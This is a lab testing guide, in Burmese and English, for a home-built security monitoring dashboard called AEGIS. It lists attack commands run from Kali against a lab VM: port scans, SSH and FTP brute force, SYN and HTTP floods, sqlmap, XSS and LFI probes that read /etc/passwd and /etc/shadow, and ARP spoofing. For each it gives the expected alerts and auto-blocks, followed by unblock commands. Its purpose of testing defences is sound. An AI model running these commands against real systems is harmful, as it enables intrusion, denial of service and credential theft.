# AEGIS — Attack Testing Guide (Step by Step)

> မှတ်တမ်း — ဒီ document က real lab မှာ attack test လုပ်ဖို့ step-by-step commands အားလုံးကို မှတ်တမ်းတင်ထားသည်။
> 
> **Setup:** Kali Linux (attacker) → Ubuntu VM (defender) → AEGIS Dashboard (monitor)

---

## Lab IP Reference

| Device | IP | Role |
|---|---|---|
| Kali Linux | `192.168.x.x` | Attacker |
| Ubuntu VM | `192.168.x.x` | Defender (Snort/Suricata/Fail2ban/Cowrie) |
| AEGIS Dashboard | https://aegis-soc-dashboard.vercel.app | Monitor only |
| AEGIS API | https://aegis-api-server-jp3b.onrender.com | Ingest + Commands |

> ⚠️ Ubuntu IP ကို `UBUNTU_IP` နဲ့ အစားထိုးပါ

---

## Pre-flight Checklist

```bash
# Ubuntu VM မှာ forwarder run ထားရမည်
sudo python3 /opt/aegis_forwarder.py --mode all
# → Dashboard Network Monitor မှာ Ubuntu ONLINE ဖြစ်ရမည်
# → Defense Center မှာ Fail2ban + Suricata ACTIVE ဖြစ်ရမည်

# Forwarder stop လုပ်ရင် → 45s အတွင်း OFFLINE အလိုအလျောက်ပြမည်
# Forwarder restart လုပ်ရင် → ချက်ချင်း ONLINE ပြမည်
```

---

## STEP 1 — Port Scan (Network Attack)

### Kali မှာ run

```bash
# Basic SYN scan
nmap -sS UBUNTU_IP

# Full port aggressive scan (Snort/Suricata က detect လုပ်မည်)
nmap -sS -sV -O -A -p 1-65535 UBUNTU_IP

# Stealth scan
nmap -sN UBUNTU_IP

# UDP scan
nmap -sU -p 53,69,123,161 UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `network / port_scan` event (severity: medium/high)
- **Command Center** → Attack volume chart တက်မည်
- **Network Monitor** → Kali IP ကို source event အဖြစ် မြင်ရမည်

### Auto-block trigger condition

- Suricata rule `ET SCAN` trigger ဖြစ်ရင် → auto-block (rule မှာ threshold သတ်မှတ်ထားသည်)

---

## STEP 2 — SSH Brute Force (Fail2ban Auto-block)

### Kali မှာ run

```bash
# hydra SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://UBUNTU_IP -t 4 -V

# medusa alternative
medusa -h UBUNTU_IP -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# ncrack
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt UBUNTU_IP
```

### ဘာဖြစ်မည်

1. Ubuntu SSH auth.log မှာ failed login တွေ record ဖြစ်မည်
2. Fail2ban က threshold ကျော်ရင် (`maxretry=5` by default) ban လုပ်မည်
3. `aegis_forwarder.py` → `POST /api/ingest/fail2ban` ကို call လုပ်မည်
4. API server → **auto-block** Kali IP → `defense_commands` table မှာ iptables command queue ဖြစ်မည်
5. Dashboard → Defense Center → Active Blocks မှာ Kali IP ပေါ်မည်

### Dashboard မှာ မြင်ရမည်

- **Active Alerts** → CRITICAL/HIGH alert: "Fail2ban banned X.X.X.X"
- **Defense Center** → Kali IP blocked (AUTO badge)
- **Security Events** → `ssh / brute_force` events

---

## STEP 3 — DDoS / SYN Flood

### Kali မှာ run

```bash
# SYN flood (hping3)
sudo hping3 -S --flood -p 80 UBUNTU_IP

# ICMP flood
sudo hping3 --icmp --flood UBUNTU_IP

# UDP flood
sudo hping3 --udp --flood -p 53 UBUNTU_IP

# HTTP flood (slowloris)
pip3 install slowloris
python3 -m slowloris UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `network / ddos` or `network / syn_flood`
- **Command Center** → Attack volume spike
- **Active Alerts** → HIGH/CRITICAL alert ပေါ်မည်

---

## STEP 4 — Web Attacks (SQLi / XSS / LFI)

> Ubuntu မှာ DVWA သို့မဟုတ် vulnerable web app run ထားရမည်

### Kali မှာ run

```bash
# SQLi scan (sqlmap)
sqlmap -u "http://UBUNTU_IP/login?id=1" --batch --level=3 --risk=2

# SQLi with forms
sqlmap -u "http://UBUNTU_IP/login" --forms --batch --dbs

# XSS test (manual curl)
curl "http://UBUNTU_IP/search?q=<script>alert(1)</script>"

# Directory traversal / LFI
curl "http://UBUNTU_IP/page?file=../../../../etc/passwd"
curl "http://UBUNTU_IP/page?file=../../../etc/shadow"

# Directory brute force (gobuster)
gobuster dir -u http://UBUNTU_IP -w /usr/share/wordlists/dirb/common.txt -x php,html

# Nikto web scan
nikto -h http://UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `web / sql_injection`, `web / xss`, `web / lfi`
- **Active Alerts** → HIGH alert ပေါ်မည်
- **Defense Center** → ModSecurity WAF auto-block (ModSecurity install ထားမှ)

---

## STEP 5 — Cowrie Honeypot (Immediate Auto-block)

> Ubuntu မှာ Cowrie run ထားရမည် (default port: 2222)

### Kali မှာ run

```bash
# Honeypot port ကို SSH connect လုပ်သည် (ချက်ချင်း auto-block trigger)
ssh root@UBUNTU_IP -p 2222

# Brute force on honeypot
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://UBUNTU_IP:2222
```

### ဘာဖြစ်မည်

- Cowrie က connection ကို fake shell ဖြင့် log လုပ်မည်
- `aegis_forwarder.py` → `POST /api/ingest/cowrie` call
- API server → **ချက်ချင်း auto-block** Kali IP (threshold=1, honeypot = immediate)
- Dashboard → Active Alerts မှာ CRITICAL alert

---

## STEP 6 — FTP Attack

```bash
# FTP brute force
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://UBUNTU_IP

# FTP banner grab
nmap -sV -p 21 UBUNTU_IP

# FTP login attempt
ftp UBUNTU_IP
```

---

## STEP 7 — ARP Spoofing / MITM

```bash
# ARP spoofing (Kali မှာ)
sudo arpspoof -i eth0 -t UBUNTU_IP GATEWAY_IP

# Or with ettercap
sudo ettercap -T -M arp:remote /UBUNTU_IP// /GATEWAY_IP//
```

---

## STEP 8 — Encrypted Traffic Anomaly (TLS)

```bash
# Weak cipher test (openssl)
openssl s_client -connect UBUNTU_IP:443 -cipher NULL-MD5

# SSL scan
sslscan UBUNTU_IP:443

# testssl
testssl.sh UBUNTU_IP:443
```

---

## After Each Attack — Unblock Commands

### Option A: Dashboard မှ unblock (Recommended)
```
Defense Center → Active Blocks → Kali IP → "Unblock" button နှိပ်
```

### Option B: API မှ unblock
```bash
curl -X DELETE https://aegis-api-server-jp3b.onrender.com/api/defense/block/KALI_IP \
  -H "X-AEGIS-Admin-Key: YOUR_ADMIN_KEY"
```

### Option C: Ubuntu VM မှာ iptables ကိုယ်တိုင် ဖြုတ်
```bash
# Rule စစ်ဆေးသည်
sudo iptables -L INPUT -n --line-numbers | grep KALI_IP

# Rule ဖြုတ်သည်
sudo iptables -D INPUT -s KALI_IP -j DROP
sudo iptables -D OUTPUT -d KALI_IP -j DROP
sudo iptables -D FORWARD -s KALI_IP -j DROP

# Fail2ban ban ဖြုတ်သည်
sudo fail2ban-client set sshd unbanip KALI_IP

# Confirm — output မထွက်ရင် unblocked ပြီ
sudo iptables -L INPUT -n | grep KALI_IP
```

---

## Manual Ingest Test (VM မလိုဘဲ simulate)

```bash
# Fail2ban ban simulate → auto-block trigger
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/fail2ban \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"ip":"10.10.10.99","service":"sshd","action":"ban","timestamp":"2026-07-02T12:00:00Z"}'

# Port scan event simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/snort \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","dst_ip":"192.168.1.10","alert":"ET SCAN Nmap","severity":"medium","timestamp":"2026-07-02T12:00:00Z"}'

# SSH brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ssh \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","username":"root","auth_method":"password","success":false,"timestamp":"2026-07-02T12:00:00Z"}'

# Cowrie honeypot simulate → immediate auto-block
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/cowrie \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"eventid":"cowrie.login.failed","src_ip":"10.10.10.99","username":"root","password":"123456","timestamp":"2026-07-02T12:00:00Z"}'

# Web attack simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/http \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","attack_type":"sql_injection","uri":"/login?id=1 OR 1=1--","method":"GET","status_code":403,"timestamp":"2026-07-02T12:00:00Z"}'

# DDoS simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","dest_ip":"192.168.1.10","alert":{"signature":"ET DOS","severity":1},"proto":"TCP","event_type":"alert","timestamp":"2026-07-02T12:00:00Z"}'
```

---

## Real-time Monitoring Flow

```
Script run    → Ubuntu ONLINE (15s heartbeat)
Script stop   → Ubuntu OFFLINE (45s auto-timeout OR instant via SIGINT)
fail2ban      → Fail2ban ACTIVE in Defense Center
suricata      → Suricata ACTIVE in Defense Center
Attack starts → Security Events feed (SSE real-time)
Threshold hit → Auto-block → Defense Center blocks + Alert fires
Unblock       → Dashboard button OR curl DELETE OR iptables -D
```

---

## Dashboard Pages Quick Reference

| Page | ဘာကြည့်ရမည် |
|---|---|
| **Command Center** | Attack volume chart, recent telemetry |
| **Security Events** | Filter by source/type/severity |
| **Active Alerts** | Critical/High alerts — acknowledge လုပ်ရမည် |
| **Network Monitor** | Kali/Ubuntu online/offline status real-time |
| **Defense Center** | Fail2ban/Suricata status, active blocks, action log |
| **System Status** | All sensor health (Suricata/Snort/Fail2ban/Cowrie/WAF) |

---

*Last updated: 2026-07-02 | AEGIS SOC Dashboard — Attack Testing Reference*
